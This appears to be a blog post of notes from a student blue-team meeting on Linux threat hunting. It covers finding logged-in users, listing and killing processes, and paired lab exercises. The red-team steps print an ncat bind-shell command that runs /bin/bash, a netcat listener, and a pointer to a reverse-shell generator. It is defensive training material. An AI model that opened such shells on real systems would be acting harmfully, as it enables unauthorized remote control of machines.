---
layout: post
title: "Linux Threat Hunting: Key Insights from the Blue Team Meeting"
subtitle: "Intro to Linux Threat Hunting with Alex Christy"
thumbnail-img: ./assets/img/Finding-Malicious_Users.png
tags: [Cybersecurity, Blue Team, Threat Hunting, Linux]
comments: true
mathjax: false
author: Alex Fluitt Martinez
---

# February 25th notes from Blue team meeting

## Intro to Linux Threat Hunting 
*by Alex Christy*

### Getting started
1. SSH into JumpBox
`ssh -i ./path/to/key ubuntu@{IP_ADDRESS}`
2. Nmap your subnet
`sudo nmap -p22 -T5 10.167.X.0/24 (X is the number you were assigned)`
3. Choose a machine
4. Tell your partner which IP address you choose
5. SSH into your machine
`ssh -i ./path/to/key ubuntu@{YOUR_MACHINE_IP}`
6. Standby…

### Who is logged in 
command: `who -u`
works to show accounts logged in through normal channels but will not work for reverse shells, bind shells, etc.

1. __Find out what terminal you have__
`tty`
2. who is logged in?
`who -u`
3. Kill the person's terminal
`sudo pkill -9 -t pts/1(SESSION_NUMBER)` (example the pts will be different depending on who u wanna kick)

### What commands are people running?
`This can be useful to differentiate normal and malicious users
Does not work on all Linux distributions
__Sysdig setup__
`sudo apt update && sudo apt install sys`
__Spy on Users:__
`sudo sysdig -c spy_users`

### What is PID?
PID (Process ID) is a unique ID for each running process on a Linux system
__Info Tidbits:__
* PID 1 is the startup process. Parent for all processes.
* Assigned sequentially to new processes
* PIDs are recycled as processes are killed
__List running processes:__ (There are alot of outputs_)
`ps -auxff`

![Finding Malicious Users](/assets/img/Finding-Malicious_Users.png)

![Find malicious processes pt 2](/assets/img/Finding-Malicious-User2.png)

### Kill malicious (or any process)
* Kill by PID: `sudo kill -9 2644` (this is because currently ncat has a PID of 2644)
`sudo pkill -9 ncat`

### DIY: Super secret spy
1. Red: SSH in your partner's machine
`ssh -i ./path/to/key ubuntu@{IP_ADDRESS}`
2. Red: Install ncat
`sudo apt update && sudo apt install -y ncat`
3. Red: Run ncat command with random port number
`ncat -lvnp {YOUR_PORT_NUMBER} -e /bin/bash`

### Bind Shells
Shell is the program that interprets the commands you type (example sh bash zsh)
__Bind shell:__ A shell bound to a port on a machine
A bind shell waits for a connection to execute commands remotely
![Discover-Bind-Shells](/assets/img/Discover-Bind-Shells.png)

### Reverse shells
* Like a bind shell but does not listen on system. Does not show up in port listing: sudo ss -tulpn
Reaches back to the attacker
Can be created with many languages: Python, bash, sh, ruby…
Language/interpreter must be on machine for it to work
Create your own reverse shells: https://www.revshells.com/

![Python-Reverse-Shell](/assets/img/Python-Reverse-Shell.png)

### DIY: Reverse Shell
1. Red: SSH in your partner's machine
`ssh -i ./path/to/key ubuntu@{IP_ADDRESS} `
2. Red: Create a bash -i reverse shell
https://www.revshells.com/
3. Red: Create a listener on your machine (new terminal)
`nc -lvnp {YOUR_REVERSE_SHELL_PORT}`
4.Red: Execute reverse shell command
5. Blue: Hunt for reverse shell process
`sudo ps -auxff | grep -v grep | grep -C 2 bash`
6. Blue: Kill reverse shell process
`sudo kill -9 {PID}`

### Notes (I noticed)
`grep -C 2 ...``
the -C adds context, so it will show 2 lines above and below
"Ncat" is the swiss army knife of networking
Good cybersecurity rely on the behavior not hte name so they can change the name of :ncat" to something else

try to learn ports pretty well
start with locking down the system